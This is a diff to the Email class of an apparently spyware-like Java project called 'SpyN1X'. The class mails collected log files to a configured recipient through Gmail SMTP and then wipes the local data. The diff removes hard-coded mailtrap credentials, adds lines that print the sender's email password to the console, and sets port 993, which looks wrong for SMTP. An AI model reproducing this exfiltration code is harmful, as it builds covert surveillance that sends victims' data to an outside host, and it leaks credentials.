@@ -9,23 +9,28 @@ import org.apache.commons.mail.EmailException;
 import org.apache.commons.mail.MultiPartEmail;
 
 import java.io.File;
+import java.text.SimpleDateFormat;
+import java.util.Date;
 
 public class Email {
     private MultiPartEmail email;
 
     public Email() {
+        SimpleDateFormat format = new SimpleDateFormat("dd-MM-yyyy");
+        System.out.println(Config.SENDER_EMAIL);
+        System.out.println(Config.SENDER_PASS);
         try {
             this.email = new MultiPartEmail();
             email.setDebug(false);
-            email.setHostName("smtp.mailtrap.io");
-            email.setSmtpPort(25);
-            email.setSSL(false);
-            email.setSSLOnConnect(false);
+            email.setHostName("smtp.gmail.com");
+            email.setSmtpPort(993);
+            email.setSSL(true);
+            email.setSSLOnConnect(true);
             email.setStartTLSEnabled(false);
             email.addTo(Config.REC_MAIL);
             email.setFrom(Config.SENDER_EMAIL);
-            email.setAuthentication("14cfcbe5a20f30", "da0fca972d7b8f");
-            email.setSubject("SpyN1X | Latest Log");
+            email.setAuthentication(Config.SENDER_EMAIL, Config.SENDER_PASS);
+            email.setSubject("SpyN1X | Log of " + format.format(new Date()));
             email.setMsg("This is system generated message. Please find the attachments below:");
         }
         catch (EmailException e) {
@@ -54,9 +59,9 @@ public class Email {
             Log.out(Color.GREEN + "[*] Email send successfully");
             FileManager.clearAllData();
         } catch (EmailException e) {
-            //Log.out(Color.RED + e.getMessage());
-            e.printStackTrace();
-            System.exit(1);
+            Log.out(Color.RED + e.getMessage());
         }
     }
+
 }
+
